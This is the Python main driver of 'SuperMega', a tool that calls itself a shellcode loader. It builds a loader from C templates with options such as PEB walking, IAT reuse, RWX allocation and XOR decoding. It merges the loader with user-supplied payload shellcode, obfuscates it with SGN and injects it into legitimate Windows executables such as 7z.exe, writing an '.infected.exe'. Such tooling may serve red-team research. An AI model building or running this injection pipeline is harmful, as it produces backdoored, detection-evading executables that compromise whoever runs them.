import shutil
import argparse
from typing import Dict
import os
import logging
import time

from helper import *
from config import config
import phases.templater
import phases.compiler
import phases.assembler
import phases.injector
from observer import observer
from pe.pehelper import extract_code_from_exe_file_ep

from model.project import Project
from model.settings import Settings
from model.defs import *
from model.carrier import Carrier
from model.exehost import ExeHost
from log import setup_logging, writelog


def main():
    """Argument parsing for when called from command line"""
    logger.info("Super Mega")
    config.load()
    settings = Settings()

    parser = argparse.ArgumentParser(description='SuperMega shellcode loader')
    parser.add_argument('--shellcode', type=str, help='The path to the file of your payload shellcode')
    parser.add_argument('--inject', type=str, help='The path to the file where we will inject ourselves in')
    parser.add_argument('--sourcestyle', type=str, help='peb_walk or iat_reuse')
    parser.add_argument('--alloc', type=str, help='Template: which allocator plugin')
    parser.add_argument('--decoder', type=str, help='Template: which decoder plugin')
    parser.add_argument('--exec', type=str, help='Template: which exec plugin')
    parser.add_argument('--rbrunmode', type=str, help='Redbackdoorer run argument (1 EAP, 2 hijack)')
    parser.add_argument('--start-injected', action='store_true', help='Dev: Start the generated infected executable at the end')
    parser.add_argument('--start-loader-shellcode', action='store_true', help='Dev: Start the loader shellcode (without payload)')
    parser.add_argument('--start-final-shellcode', action='store_true', help='Debug: Start the final shellcode (loader + payload)')
    parser.add_argument('--short-call-patching', action='store_true', help='Make short calls long. You will know when you need it.')
    parser.add_argument('--no-clean-at-start', action='store_true', help='Debug: Dont remove any temporary files at start')
    parser.add_argument('--no-clean-at-exit', action='store_true', help='Debug: Dont remove any temporary files at exit')
    parser.add_argument('--verify', type=str, help='Debug: Perform verification: std/iat')
    parser.add_argument('--show', action='store_true', help='Debug: Show tool output')
    args = parser.parse_args()

    if args.show:
        config.ShowCommandOutput = True

    if args.verify:
        settings.payload_path = "data/shellcodes/createfile.bin"
        settings.verify = True

        settings.try_start_final_infected_exe = False

        if args.verify == "peb":
            settings.source_style = SourceStyle.peb_walk
            settings.inject_mode = InjectStyle.BackdoorCallInstr
            settings.inject_exe_in = "data/exes/7z.exe"
            settings.inject_exe_out = "data/exes/7z-verify.exe"
        elif args.verify == "iat":
            settings.source_style = SourceStyle.iat_reuse
            settings.inject_mode = InjectStyle.BackdoorCallInstr
            settings.inject_exe_in = "data/exes/procexp64.exe"
            settings.inject_exe_out = "data/exes/procexp64-verify.exe"
        elif args.verify == "rwx":
            settings.source_style = SourceStyle.peb_walk
            settings.inject_mode = InjectStyle.ChangeEntryPoint  # ,2 is broken atm
            settings.inject_exe_in = "data/exes/wifiinfoview.exe"
            settings.inject_exe_out = "data/exes/wifiinfoview.exe-verify.exe"
        else:
            logger.info("Unknown verify option {}, use std/iat".format(args.verify))
            return

    else:
        settings.try_start_final_infected_exe = args.start_injected
        settings.cleanup_files_on_start = not args.no_clean_at_start
        settings.cleanup_files_on_exit =not args.no_clean_at_exit

        if args.short_call_patching:
            settings.short_call_patching = True

        if args.sourcestyle:
            if args.sourcestyle == "peb_walk":
                settings.source_style = SourceStyle.peb_walk
            elif args.sourcestyle == "iat_reuse":
                settings.source_style = SourceStyle.iat_reuse

        if args.alloc:
            if args.alloc == "rwx_1":
                settings.alloc_style = AllocStyle.RWX
        if args.decoder:
            if args.decoder == "plain_1":
                settings.decoder_style = DecoderStyle.PLAIN_1
            elif args.decoder == "xor_1":
                settings.decoder_style = DecoderStyle.XOR_1
        if args.exec:
            if args.exec == "direct_1":
                settings.exec_style = ExecStyle.CALL

        if args.inject:
            if args.rbrunmode == "eop":
                settings.inject_mode = InjectStyle.ChangeEntryPoint
            elif args.rbrunmode == "backdoor":
                settings.inject_mode = InjectStyle.BackdoorCallInstr
            else:
                logging.error("Invalid mode, use one of:")
                for i in ["eop", "backdoor"]:
                    logging.error("  {}  {}".format(i, rbrunmode_str(i)))
                return

        if not args.shellcode or not args.inject:
            logger.error("Require: --shellcode <shellcode file> --inject <injectable.exe>")
            logger.info(r"Example: .\supermega.py --shellcode .\data\shellcodes\calc64.bin --inject .\data\exes\7z.exe")
            return 1

        if args.shellcode:
            if not os.path.isfile(args.shellcode):
                logger.info("Could not find: {}".format(args.shellcode))
                return
            settings.payload_path = args.shellcode
        if args.inject:
            if not os.path.isfile(args.inject):
                logger.info("Could not find: {}".format(args.inject))
                return
            settings.inject_exe_in = args.inject
            settings.inject_exe_out = args.inject.replace(".exe", ".infected.exe")

    exit_code = start(settings)
    exit(exit_code)


def start(settings: Settings):
    """Main entry point for the application. This is where the magic happens, based on settings"""

    # Delete: all old files
    if settings.cleanup_files_on_start:
        clean_files()
        delete_all_files_in_directory(f"{logs_dir}/")
    exit_code = 0  # 0 = success

    # Load our input
    project = Project(settings)
    project.init()

    logger.warning("--I SourceStyle: {}  Inject Mode: {}  ".format(
        project.settings.source_style.value, project.settings.inject_mode.value))
    logger.warning("--I   Loader modules:  Alloc: {}  Decoder: {}  Exec: {}".format(
        project.settings.alloc_style.value, 
        project.settings.decoder_style.value,
        project.settings.exec_style.value
    ))

    # Create: Carrier C source files from template (C->C)
    phases.templater.create_c_from_template(
        source_style = settings.source_style,
        alloc_style  = settings.alloc_style,
        exec_style   = settings.exec_style,
        decoder_style= settings.decoder_style,
        payload_len  = project.payload.len,
    )

    # Compile: Carrier to .asm (C -> ASM)
    if settings.generate_asm_from_c:
        try:
            phases.compiler.compile(
                c_in = main_c_file, 
                asm_out = main_asm_file, 
                payload_len = project.payload.len,
                carrier = project.carrier,
                source_style = project.settings.source_style,
                exe_host = project.exe_host,
                short_call_patching = project.settings.short_call_patching)
        except Exception as e:
            logger.error(f'Error compiling: {e}')
            return exit(1)

    # Assemble: Assemble .asm to .shc (ASM -> SHC)
    if settings.generate_shc_from_asm:
        phases.assembler.asm_to_shellcode(
            asm_in = main_asm_file, 
            build_exe = main_exe_file, 
            shellcode_out = main_shc_file)
    
    # Merge: shellcode/loader with payload (SHC + PAYLOAD -> SHC)
    if settings.dataref_style == DataRefStyle.APPEND:
        phases.assembler.merge_loader_payload(
            shellcode_in = main_shc_file,
            shellcode_out = main_shc_file,
            payload_data = project.payload.payload_data, 
            decoder_style = settings.decoder_style)

    # RWX Injection (optional): obfuscate loader+payload
    if project.exe_host.rwx_section != None:
        logger.info("--[ RWX section {} found. Will obfuscate loader+payload and inject into it".format(
            project.exe_host.rwx_section.Name.decode().rstrip('\x00')
        ))
        obfuscate_shc_loader(main_shc_file, main_shc_file + ".sgn")
        observer.add_code("payload_sgn", file_readall_binary(main_shc_file + ".sgn"))
        shutil.move(main_shc_file + ".sgn", main_shc_file)

    # inject merged loader into an exe
    try:
        phases.injector.inject_exe(main_shc_file, settings, project)
    except PermissionError as e:
        logger.error(f'Error writing file: {e}')
        return exit(2)
    
    observer.add_code("exe_final", extract_code_from_exe_file_ep(settings.inject_exe_out, 300))

    # Start/verify it at the end
    if settings.verify:
        logger.info("--[ Verify infected exe")
        exit_code = phases.injector.verify_injected_exe(settings.inject_exe_out)
    elif settings.try_start_final_infected_exe:
        logger.info("--[ Start infected exe: {}".format(settings.inject_exe_out))
        run_process_checkret([
            settings.inject_exe_out,
        ], check=False)

    # Cleanup files
    if settings.cleanup_files_on_exit:
        clean_files()

    writelog()
    return exit_code


def obfuscate_shc_loader(file_shc_in, file_shc_out):
    logger.info("--[ Obfuscate shellcode with SGN")
    run_process_checkret([
        config.get("path_sgn"),
        "--arch=64",
        "-i", "{}".format(file_shc_in),
        "-o", "{}".format(file_shc_out),
    ], check=True)
    if not os.path.isfile(file_shc_out):
        logger.info("Error")
        return
    else:
        logger.info("   > Success obfuscation")
        pass


def verify_shellcode(shc_name):
    logger.info("---[ Verify shellcode: {}".format(shc_name))

    # check if directory exists
    if not os.path.exists(os.path.dirname(VerifyFilename)):
        logger.info("Error, directory does not exist for: {}".format(VerifyFilename))
        return
    
    # remove indicator file
    pathlib.Path(VerifyFilename).unlink(missing_ok=True)

    run_process_checkret([
        config.get("path_runshc"),
        "{}".format(shc_name),
    ], check=False)
    time.sleep(SHC_VERIFY_SLEEP)
    if os.path.isfile(VerifyFilename):
        logger.info("---> Verify OK. Shellcode works (file was created)")
        os.remove(VerifyFilename)
        return True
    else:
        logger.error("---> Verify FAIL. Shellcode doesnt work (file was not created)")
        return False


if __name__ == "__main__":
    setup_logging()
    main()
